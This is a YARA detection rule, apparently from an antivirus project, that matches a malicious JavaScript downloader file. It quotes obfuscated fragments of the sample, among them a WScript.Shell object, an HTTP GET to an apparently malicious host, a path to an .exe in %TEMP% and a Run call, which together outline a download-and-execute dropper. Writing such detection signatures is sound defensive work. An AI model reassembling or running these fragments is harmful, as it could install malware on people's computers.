rule sig_20160328_624e2c6b1e977ebd0244a2292249ddaa {
  meta:
    description = "datamaliciousorder - file 20160328_624e2c6b1e977ebd0244a2292249ddaa.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0eb764dc4b0846225c36fcad5002470d774f5c2713f36870a336b8e24c69df59"

  strings:
    $s1  = "function Qoyuia() {return Atmpme[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"A2F0IcrDeT.exe\";};" fullword ascii
    $s2  = "Qniyokihn[Nmblmpbyyb](\"GET\", \"http://bbwsa.com/m7rysa\", false);" fullword ascii
    $s3  = "var Atmpme = function Vyixury() {return WScript[Draehzbjzj](\"WScript.Shell\");}();" fullword ascii
    $s4  = "do {WScript[Rxppa](Jtzdglwm() * 11)} while (Qniyokihn[\"readystate\"] < 4 );" fullword ascii
    $s5  = "function Dsleq(Aewyau, Nzfmhuxyoi){return Aewyau - Nzfmhuxyoi;};" fullword ascii
    $s6  = "function Iqapnlyx(Vafyxhmskp){Atmpme[\"Run\"](Vafyxhmskp, Gxyhfvjpe, Gxyhfvjpe);};" fullword ascii
    $s7  = "function Melhldqwej() {return ((Dughhnneu == true) && (Dughhnneu == Kemibch)) ? 1 : Gxyhfvjpe;};" fullword ascii
    $s8  = "var Ftolrwoc = new this[\"Date\"]();" fullword ascii
    $s9  = "return Dsleq(Llepvu, Tyomrqzrm);" fullword ascii
    $s10 = "function Zsirmilhm(Hhsbynywvr) {var Nuaymosnis = (1, 2, 3, 4, 5, Hhsbynywvr); return Nuaymosnis;};" fullword ascii
    $s11 = "function Kbrpmy()" fullword ascii
    $s12 = "var Kemibch = false;" fullword ascii
    $s13 = "function Pgzvffqm(){return Tyuxgcgri;};" fullword ascii
    $s14 = "function Jtzdglwm(){return 22;};" fullword ascii
    $s15 = "var Bochsmcogt = false;" fullword ascii
    $s16 = "Dughhnneu = true; " fullword ascii
    $s17 = " while (Cszgudzrn){" fullword ascii
    $s18 = "function Llohxz(){return Draehzbjzj;};" fullword ascii
    $s19 = "var Dughhnneu = false;" fullword ascii
    $s20 = "Kemibch = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}